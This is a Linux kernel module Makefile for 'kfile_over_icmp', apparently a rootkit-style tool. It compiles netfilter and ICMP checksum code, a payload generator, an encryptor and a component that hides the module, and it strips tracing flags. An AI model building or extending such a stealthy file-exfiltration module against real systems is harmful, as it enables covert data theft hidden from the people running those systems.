MODULENAME := kfile_over_icmp

obj-m += $(MODULENAME).o

ifeq ($(DEBUG), 1)
ccflags-y += -DDEBUG
endif

ccflags-y += -O0 -Wno-declaration-after-statement -Wno-discarded-qualifiers

$(MODULENAME)-y += src/chrdev/chrdev.o
$(MODULENAME)-y += src/fs/payload_generator.o
$(MODULENAME)-y += src/net/netfilter.o src/net/checksum.o
$(MODULENAME)-y += src/core.o src/init.o
$(MODULENAME)-y += src/utils/hiders/hide_module.o 
$(MODULENAME)-y += src/utils/modifiers/encryptor.o 

KBUILD_CFLAGS := $(filter-out -pg,$(KBUILD_CFLAGS))
KBUILD_CFLAGS := $(filter-out -mfentry,$(KBUILD_CFLAGS))